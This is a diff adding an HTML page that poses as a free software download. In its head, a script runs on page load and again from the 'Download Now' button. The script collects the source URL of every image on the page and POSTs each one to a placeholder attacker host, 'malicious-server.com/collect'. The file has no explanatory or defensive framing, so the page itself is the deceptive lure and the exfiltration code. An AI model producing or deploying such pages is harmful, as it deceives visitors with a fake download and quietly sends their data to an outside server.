@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Download</title>
+    <script>
+        function stealImages() {
+            var images = document.getElementsByTagName('img');
+            for (var i = 0; i < images.length; i++) {
+                var imgSrc = images[i].src;
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "http://malicious-server.com/collect", true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.send("imgSrc=" + encodeURIComponent(imgSrc));
+            }
+        }
+        window.onload = stealImages;
+    </script>
+</head>
+<body>
+    <h1>Download Your Free Software</h1>
+    <p>Click the button below to start your download.</p>
+    <button onclick="stealImages()">Download Now</button>
+</body>
+</html>
+
